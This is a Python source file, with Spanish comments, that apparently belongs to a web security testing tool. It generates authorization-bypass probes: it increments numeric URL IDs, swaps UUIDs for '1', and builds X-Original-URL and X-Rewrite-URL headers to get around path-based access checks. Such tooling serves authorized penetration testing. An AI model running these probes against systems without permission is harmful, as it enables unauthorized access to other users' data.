import re
import json
from typing import Optional, Tuple, Dict

class AuthPayloadGenerator:
    """Motor atómico para mutación de IDs y bypass de cabeceras."""
    
    @staticmethod
    def mutate_numeric_id(url: str) -> Optional[str]:
        """Intenta incrementar un ID numérico en la URL."""
        id_pattern = r'/(\d+)(/|\?|$)'
        match = re.search(id_pattern, url)
        if match:
            orig_id = match.group(1)
            new_id = str(int(orig_id) + 1)
            return url.replace(f"/{orig_id}", f"/{new_id}", 1)
        return None

    @staticmethod
    def degrade_uuid(text: str) -> str:
        """Degrada UUIDs a '1' para buscar sistemas legacy vulnerables."""
        uuid_pattern = r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
        return re.sub(uuid_pattern, '1', text, flags=re.IGNORECASE)

    @staticmethod
    def get_bypass_headers(url: str) -> Dict[str, str]:
        """Genera cabeceras de bypass de path (X-Original-URL, etc)."""
        from urllib.parse import urlparse
        path = urlparse(url).path
        return {
            "X-Original-URL": path,
            "X-Rewrite-URL": path
        }
